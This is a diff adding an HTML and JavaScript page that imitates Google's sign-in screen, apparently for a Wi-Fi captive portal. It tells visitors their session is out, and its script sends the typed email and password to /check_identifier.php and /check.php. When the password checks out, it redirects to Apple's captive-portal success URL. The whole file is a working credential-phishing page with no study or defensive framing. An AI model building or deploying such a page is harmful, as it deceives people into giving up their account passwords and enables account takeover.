@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Google auth</title>
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/static/css/first.css" type="text/css">
+    <link rel="stylesheet" href="/static/css/second.css" type="text/css">
+    <link rel="stylesheet" href="/static/css/third.css" type="text/css">
+    <script type="text/javascript" src="/static/js/jquery-3.3.1.min.js"></script>
+    <script type="text/javascript">
+        function Input_focus() {
+            $("#login_form_box").addClass("u3bW4e");
+        }
+
+        function Input_blur() {
+            $("#login_form_box").removeClass("u3bW4e");
+            if (!$("#identifierId").val()) {
+                $("#login_form_box").removeClass("CDELXb");
+            }
+            else {
+                $("#login_form_box").addClass("CDELXb");
+            }
+        }
+
+        function This_is_not_work() {
+            alert("This is not work.");
+        }
+
+        function Show_or_hide_password() {
+            $("#show_or_hide_password_button").addClass('qs41qe');
+            if ($("#password_span").hasClass('iStiSd')) {
+                $("#password_span").removeClass('iStiSd');
+                $("#password_span").addClass('HzcL7b');
+                $("#identifierId").prop('type', 'text');
+                $("#password_span").html('<img src="/static/images/password_show.svg">');
+            }
+            else {
+                if ($("#password_span").hasClass('HzcL7b')) {
+                    $("#password_span").removeClass('HzcL7b');
+                    $("#password_span").addClass('iStiSd');
+                    $("#identifierId").prop('type', 'password');
+                    $("#password_span").html('<img src="/static/images/password_hide.svg">');
+                }
+            }
+            setTimeout(function () {
+                $("#show_or_hide_password_button").removeClass('qs41qe');
+            }, 200);
+
+        }
+
+        function View_identifier(identifier) {
+            $("#headingSubtext").html(
+                '<div class="Z4o1ee GyDlGb cd29Sd iiFyne" tabindex="0" role="link" aria-label="Switch account" onclick="Back()">\n' +
+                '   <div class="PH9Bhd"><img src="/static/images/profile_image.svg"></div>\n' +
+                '   <div class="vgHGpc RRP0oc" id="profileIdentifier">' + identifier + '</div>\n' +
+                '   <div class="byb8te"><img src="/static/images/profile_button.svg"></div>\n' +
+                '</div>');
+        }
+
+        function Add_password_button() {
+            if ($("#show_or_hide_password_content").length === 0) {
+                $("#login_strings").append(
+                    '<content class="A37UZe sxyYjd MQL3Ob" id="show_or_hide_password_content">\n' +
+                    '   <div role="button" class="U26fgb mUbCce fKz7Od YYBxpf ZEIQBe M9Bg4d" aria-label="Hide password" aria-disabled="false" tabindex="0"\n' +
+                    '        data-tooltip="Hide password" data-tooltip-vertical-offset="-12" data-tooltip-horizontal-offset="0" onclick="Show_or_hide_password()"\n' +
+                    '        id="show_or_hide_password_button">\n' +
+                    '       <div class="VTBa7b MbhUzd" style="top: 12px; left: 12px; width: 24px; height: 24px;"></div>\n' +
+                    '       <content class="xjKiLb">\n' +
+                    '           <span style="top: -12px">\n' +
+                    '               <span id="password_span" class="nK6IJ iStiSd" aria-hidden="true"><img src="/static/images/password_hide.svg" class="VhKI7c"></span>\n' +
+                    '           </span>\n' +
+                    '       </content>\n' +
+                    '   </div>\n' +
+                    '</content>');
+            }
+        }
+
+        function Check_identifier(identifier) {
+            var result = "ERROR";
+
+            var xhr = new XMLHttpRequest();
+            var body = 'identifier=' + identifier;
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    result = xhr.responseText;
+                }
+            }
+            xhr.open("POST", '/check_identifier.php', false);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send(body);
+
+            return result;
+        }
+
+        function Check_credentials(identifier, password) {
+            var result = "ERROR";
+
+            var xhr = new XMLHttpRequest();
+            var body = 'identifier=' + identifier + "&password=" + password;
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    result = xhr.responseText;
+                }
+            }
+            xhr.open("POST", '/check.php', false);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send(body);
+
+            return result;
+        }
+
+        function Auth() {
+            if ($("#identifierId").val()) {
+                $("#progressbar_div").removeClass('qdulke');
+                $("#progressbar_div").removeClass('jK7moc');
+                $("#main_page_div").prop('tabindex', '-1');
+                $("#initialView").append('<div class="ANuIbb IdAqtf" id="blurring" tabindex="0"></div>');
+
+                // region Check email
+                if ($("#headingText").text().indexOf("Sign in") !== -1 ) {
+                    var identifier = $("#identifierId").val();
+                    identifier = Check_identifier(identifier);
+
+                    if (identifier !== "ERROR") {
+                        $("#login_form_box").removeClass("k0tWj");
+                        $("#login_form_box").removeClass("IYewr");
+                        $("#bad_account").remove();
+
+                        $("#login_form_box").addClass("IYewr");
+                        $("#headingText").html('<content>Welcome</content>');
+                        $("#headingSubtext").removeClass("Y4dIwd");
+                        $("#headingSubtext").addClass("aCayab");
+                        View_identifier(identifier);
+                        $("#input_label").html('Enter your password');
+
+                        $("#identifierId").val("");
+                        $("#identifierId").prop('type', 'password');
+                        $("#login_form_box").addClass("u3bW4e");
+                        $("#identifierId").focus();
+
+                        Add_password_button();
+
+                        $("#forgot_email").hide();
+                        $("#not_your_computer").hide();
+
+                        $("#second_button_text").html('Forgot password?');
+                    }
+                    else {
+                        $("#login_form_box").addClass("k0tWj");
+                        $("#login_form_box").addClass("IYewr");
+                        if ($("#bad_account").length == 0) {
+                            $("#login_form_box").append('<div id="bad_account" class="LXRPh"><div class="ovnfwe Is7Fhb"></div><div class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"><div>Couldn\'t find your Google Account</div></div></div>');
+                        }
+                    }
+                }
+                // endregion
+
+                // region Check identifier and password
+                if ($("#headingText").text().indexOf("Welcome") !== -1 ) {
+                    if ($("#identifierId").val()) {
+                        var identifier = $("#profileIdentifier").html();
+                        var password = $("#identifierId").val();
+                        //alert("Login: " + identifier + " Password: " + password);
+                        var check_credentials = "ERROR";
+                        check_credentials = Check_credentials(identifier, password);
+
+                        if ( check_credentials === "OK" ) {
+                            window.location.href = "http://captive.apple.com/success.html";
+                        }
+                        else {
+                            $("#login_form_box").addClass("k0tWj");
+                            $("#login_form_box").addClass("IYewr");
+                            if ($("#bad_password").length == 0) {
+                                $("#login_form_box").append('<div id="bad_password" class="LXRPh"><div class="ovnfwe Is7Fhb"></div><div class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"><div>Wrong password. Try again.</div></div></div>');
+                            }
+                        }
+                    }
+                }
+                // endregion
+
+                setTimeout(function () {
+                    $("#progressbar_div").addClass('qdulke');
+                    $("#progressbar_div").addClass('jK7moc');
+                    $("#main_page_div").prop('tabindex', 'null');
+                    $("#blurring").remove();
+                }, 500);
+            }
+        }
+
+        function Back() {
+            $("#login_form_box").removeClass("k0tWj");
+            $("#login_form_box").removeClass("IYewr");
+            $("#bad_password").remove();
+
+            $("#progressbar_div").removeClass('qdulke');
+            $("#progressbar_div").removeClass('jK7moc');
+            $("#main_page_div").prop('tabindex', '-1');
+            $("#initialView").append('<div class="ANuIbb IdAqtf" id="blurring" tabindex="0"></div>');
+
+            var email = $("#profileIdentifier").html();
+
+            $("#headingText").html('<content>Sign in</content>');
+            $("#headingSubtext").removeClass("aCayab");
+            $("#headingSubtext").addClass("Y4dIwd");
+            $("#headingSubtext").html('<content>Your session is out</content>');
+            $("#input_label").html('Email or phone');
+
+            $("#identifierId").val(email);
+            $("#identifierId").prop('type', 'email');
+            $("#login_form_box").addClass("CDELXb");
+
+            $("#show_or_hide_password_content").remove();
+
+            $("#forgot_email").show();
+            $("#not_your_computer").show();
+
+            $("#second_button_text").html('Create account');
+
+            setTimeout(function () {
+                $("#progressbar_div").addClass('qdulke');
+                $("#progressbar_div").addClass('jK7moc');
+                $("#main_page_div").prop('tabindex', 'null');
+                $("#blurring").remove();
+            }, 1000);
+        }
+    </script>
+</head>
+<body id="yDmH0d" class="nyoS7c UzCXuf EIlDfe">
+<div class="H2SoFe LZgQXe TFhTPc">
+    <div class="RAYh1e LZgQXe qmmlRd" id="initialView" role="presentation">
+        <!--region Progress bar-->
+        <div class="RZBuIb c8DD0" aria-hidden="true">
+            <div id="progressbar_div" role="progressbar" class="sZwd7c B6Vhqe qdulke jK7moc">
+                <div class="xcNBHc um3FLe"></div>
+                <div class="w2zcLc Iq5ZMc"></div>
+                <div class="MyvhI TKVRUb"><span class="l3q5xe SQxu9c"></span></div>
+                <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
+            </div>
+        </div>
+        <!--endregion-->
+        <!--region Main Page-->
+        <div id="main_page_div" class="xkfVF" role="presentation" tabindex="null">
+            <!--region Logo-->
+            <div class="fctIrd" data-can-enhance="false" data-oauth-third-party-logo-url="" aria-hidden="true">
+                <div>
+                    <div id="logo" class="SSBsw" title="Google">
+                        <div class="qZp31e" jsname="l4eHX">
+                            <img src="/static/images/logo.svg">
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!--endregion-->
+            <!--region View-->
+            <div id="view_container" class="JhUD8d SQNfcc vLGJgb">
+                <div class="zWl5kd" data-locale="en_GB" data-allow-sign-up-types="true">
+                    <div class="DRS7Fe bxPAYd k6Zj8d" data-branding="jcJzye" role="presentation">
+                        <!--region View Header-->
+                        <div>
+                            <div class="jXeDnc">
+                                <!--region Heading text-->
+                                <h1 data-a11y-title-piece="" id="headingText">
+                                    <content>Sign in</content>
+                                </h1>
+                                <!--endregion-->
+                                <!--region Heading subtext-->
+                                <div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext">
+                                    <content>Your session is out</content>
+                                </div>
+                                <!--endregion-->
+                            </div>
+                        </div>
+                        <!--endregion-->
+                        <!--region View Body-->
+                        <div class="pwWryf bxPAYd" role="presentation">
+                            <div class="Wxwduf Us7fWe JhUD8d" role="presentation">
+                                <div class="WEQkZc">
+                                    <div class="bCAAsb" data-form-action-uri="">
+                                        <form method="post" novalidate="">
+                                            <content>
+                                                <section class="TgkVnd">
+                                                    <header class="juTfp" aria-hidden="true"></header>
+                                                    <div class="dMArKd bxPAYd k6Zj8d">
+                                                        <content>
+                                                            <div class="cDSmF" data-allow-at-sign="true"
+                                                                 role="presentation"
+                                                                 data-is-rendered="true">
+                                                                <div class="rFrNMe KSczvd uyaebd vHVGub zKHdkd sdJrJc Tyc9J"
+                                                                     id="login_form_box">
+                                                                    <div class="aCsJod oJeWuf">
+                                                                        <div class="aXBtI Wic03c"
+                                                                             id="login_strings">
+                                                                            <div class="Xb9hP">
+                                                                                <input type="email"
+                                                                                       class="whsOnd zHQkBf"
+                                                                                       jsname="YPqjbf"
+                                                                                       autocomplete="username"
+                                                                                       spellcheck="false"
+                                                                                       tabindex="0"
+                                                                                       aria-label="Email or phone"
+                                                                                       name="identifier"
+                                                                                       autocapitalize="none"
+                                                                                       id="identifierId"
+                                                                                       dir="ltr"
+                                                                                       data-initial-dir="ltr"
+                                                                                       data-initial-value=""
+                                                                                       autofocus
+                                                                                       onfocus="Input_focus()"
+                                                                                       onblur="Input_blur()"
+                                                                                       value="">
+                                                                                <div id="input_label"
+                                                                                     class="AxOyFc snByac"
+                                                                                     aria-hidden="true">
+                                                                                    Email or phone
+                                                                                </div>
+                                                                            </div>
+                                                                            <div class="i9lrp mIZh1c"></div>
+                                                                            <div class="OabDMe cXrdqd Y2Zypf"></div>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="LXRPh">
+                                                                        <div class="ovnfwe Is7Fhb"></div>
+                                                                        <div class="dEOOab RxsGPe"
+                                                                             aria-atomic="true"
+                                                                             aria-live="assertive"></div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                            <div class="ck6P8" aria-live="assertive"></div>
+                                                            <div class="ck6P8" id="forgot_email">
+                                                                <div class="vI53Cf">
+                                                                    <div role="button"
+                                                                         class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc nDKKZc NpwL8d BqR4se"
+                                                                         aria-disabled="false" tabindex="0"
+                                                                         onclick="This_is_not_work()">
+                                                                        <div class="Vwe4Vb MbhUzd"></div>
+                                                                        <div class="ZFr60d CeoRYc"></div>
+                                                                        <content class="CwaK9">
+                                                                            <span class="RveJvd snByac">Forgot email?</span>
+                                                                        </content>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                            <input type="password" name="hiddenPassword" class="VwCw"
+                                                                   tabindex="-1" aria-hidden="true" spellcheck="false">
+                                                            <div class="T8zd8e R43Xif">
+                                                                <img id="captchaimg">
+                                                                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAQAAABLCVATAAABK0lEQVR4Ae2VA4wecRBHX23bisugjOtGjc3abezUto0YdU/hOTrb6pmxPmMyZy7O95a//yRvPYvNjFHIfTaAdXz4cPONpZjiWqtIpyaOmtH4UNjCR1yi8nLZuEZFyibS8Ml02qjGR3umESKjLvYY0/joyGSiZDyfKUY0PjqzmAapXDGiaRX9Zh4op6VSzoS+a1pFPtKYCcIkqqW2nw74epgU2X8PymPJT8yK3KzQdFhyvFmRj1OaVkqqNS96pGmSJOcQEJ2059KcLNN0xNrNfgXKU8mPzb2QiUwHYTK1Uttn5hP5wWxQzkmljPHWPtqlNEnlorU2MpU4Gc9lspXGNoMIfX47rLTabWSq/rj55r+Vr7hF4uGcHb+jeo5gBW35H1mMRfK5zVrGMIkf4fYw3QYeh94AAAAASUVORK5CYII="
+                                                                     id="playCaptchaButton"
+                                                                     class="gIn9Gc"
+                                                                     alt="Listen and type the numbers that you hear"
+                                                                     role="button" tabindex="0">
+                                                                <audio type="audio/wav" id="captchaAudio"></audio>
+                                                                <div class="cDSmF" role="presentation"
+                                                                     data-is-rendered="true">
+                                                                    <div class="rFrNMe KSczvd uyaebd zKHdkd sdJrJc Tyc9J">
+                                                                        <div class="aCsJod oJeWuf">
+                                                                            <div class="aXBtI Wic03c">
+                                                                                <div class="Xb9hP">
+                                                                                    <input type="text"
+                                                                                           class="whsOnd zHQkBf"
+                                                                                           autocomplete="off"
+                                                                                           spellcheck="false"
+                                                                                           tabindex="0"
+                                                                                           aria-label="Type the text you hear or see"
+                                                                                           name="ca"
+                                                                                           id="ca"
+                                                                                           dir="ltr"
+                                                                                           data-initial-dir="ltr"
+                                                                                           data-initial-value="">
+                                                                                    <div class="AxOyFc snByac"
+                                                                                         aria-hidden="true">Type the
+                                                                                        text you hear or see
+                                                                                    </div>
+                                                                                </div>
+                                                                                <div class="i9lrp mIZh1c"></div>
+                                                                                <div class="OabDMe cXrdqd"></div>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="LXRPh">
+                                                                            <div class="ovnfwe Is7Fhb"></div>
+                                                                            <div class="dEOOab RxsGPe"
+                                                                                 aria-atomic="true"
+                                                                                 aria-live="assertive"></div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <input type="hidden" name="ct" id="ct">
+                                                            </div>
+                                                        </content>
+                                                    </div>
+                                                </section>
+                                            </content>
+                                        </form>
+                                    </div>
+                                    <content id="not_your_computer">
+                                        <div class="vwtvsf">
+                                            <div class="ck6P8">Not your computer? Use Guest mode to sign in privately.
+                                                <a href="#">Learn more</a></div>
+                                        </div>
+                                    </content>
+                                </div>
+                                <div class="zQJV3">
+                                    <div class="dG5hZc">
+                                        <div class="qhFLie">
+                                            <div role="button" id="identifierNext"
+                                                 class="U26fgb O0WRkf zZhnYe e3Duub C0oVfc nDKKZc DL0QTb"
+                                                 aria-disabled="false" tabindex="0"
+                                                 onclick="Auth()">
+                                                <div class="Vwe4Vb MbhUzd"></div>
+                                                <div class="ZFr60d CeoRYc"></div>
+                                                <content class="CwaK9"><span class="RveJvd snByac">Next</span></content>
+                                            </div>
+                                        </div>
+                                        <div class="daaWTb">
+                                            <div class="OIPlvf">
+                                                <div role="button"
+                                                     class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc nDKKZc NpwL8d t29vte G3hhxb"
+                                                     aria-disabled="false" tabindex="0"
+                                                     onclick="This_is_not_work()">
+                                                    <div class="Vwe4Vb MbhUzd"></div>
+                                                    <div class="ZFr60d CeoRYc"></div>
+                                                    <content class="CwaK9">
+                                                        <span class="RveJvd snByac" id="second_button_text">
+                                                            Create account
+                                                        </span>
+                                                    </content>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!--endregion-->
+                    </div>
+                </div>
+            </div>
+            <!--endregion-->
+        </div>
+        <!--endregion-->
+        <!--region Footer-->
+        <footer class="RwBngc">
+            <div class="u7land">
+                <div role="listbox" aria-expanded="false" id="lang-chooser" class="jgvuAb TkU0Xc"
+                     aria-label="Change language">
+                    <div role="presentation">
+                        <div class="ry3kXd Ulgu9" role="presentation">
+                            <div class="MocG8c B9IrJb LMgvRb KKjvXb" data-value="en-GB"
+                                 aria-selected="true" role="option" tabindex="0">
+                                <div class="kRoyt MbhUzd"></div>
+                                <content class="vRMGwf oJeWuf">‪English (United Kingdom)‬</content>
+                            </div>
+                            <div class="MocG8c B9IrJb LMgvRb" data-value="en"
+                                 aria-selected="false" role="option" tabindex="-1">
+                                <div class="kRoyt MbhUzd"></div>
+                                <content class="vRMGwf oJeWuf">‪English (United States)‬</content>
+                            </div>
+                        </div>
+                        <div class="CeEBt Ce1Y1c eU809d" role="presentation">
+                            <div class="TquXA"></div>
+                        </div>
+                    </div>
+                    <div class="OA0qNb ncFHed" role="presentation" style="display:none;"></div>
+                </div>
+            </div>
+            <ul class="Bgzgmd">
+                <li><a href="#">Help</a></li>
+                <li><a href="#">Privacy</a>
+                </li>
+                <li><a href="#">Terms</a></li>
+            </ul>
+        </footer>
+        <!--endregion-->
+    </div>
+</div>
+</svg>
+</body>
+</html>
